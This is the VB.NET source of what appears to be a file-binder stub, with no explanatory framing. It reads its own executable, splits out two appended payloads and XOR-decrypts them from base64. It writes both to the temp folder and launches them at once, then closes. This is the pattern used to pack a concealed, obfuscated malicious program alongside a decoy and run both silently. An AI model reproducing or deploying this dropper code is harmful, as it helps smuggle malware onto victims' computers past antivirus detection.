﻿Imports System.IO
Imports System.Reflection
Imports System.Text
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        System.Threading.ThreadPool.QueueUserWorkItem(Sub() _load())
    End Sub

    ' Index List:
    ' [0] the stub itself - leave this alone
    ' [1] XOR key (string format)
    ' [2] Primary file content (base-64 format)
    ' [3] Secondary file content (base-64 format)
    ' [4] Primary filename (string format)
    ' [5] Secondary filename (string format)

    Private Sub _load()

        Dim _tmp As String = My.Computer.FileSystem.SpecialDirectories.Temp

        Dim settings() As String = Split(File.ReadAllText(Application.ExecutablePath), "|FS|")

        'extract xor key
        Dim _key As String = settings(1)

        'decrypt xor file content
        Dim File1 As Byte() = _decrypt(settings(2), _key)
        Dim File2 As Byte() = _decrypt(settings(3), _key)

        'write files to disk
        My.Computer.FileSystem.WriteAllBytes(_tmp & "\" & settings(4), File1, False)
        My.Computer.FileSystem.WriteAllBytes(_tmp & "\" & settings(5), File2, False)

        'execute files
        Process.Start(_tmp & "\" & settings(4))
        Process.Start(_tmp & "\" & settings(5))

        'exit
        Me.Close()
    End Sub

    Function _decrypt(base64String As String, password As String) As Byte()
        Dim encryptedBytes As Byte() = Convert.FromBase64String(base64String)
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
        Dim decryptedBytes As Byte() = New Byte(encryptedBytes.Length - 1) {}

        For i As Integer = 0 To encryptedBytes.Length - 1
            decryptedBytes(i) = encryptedBytes(i) Xor passwordBytes(i Mod passwordBytes.Length)
        Next

        Return decryptedBytes
    End Function
End Class
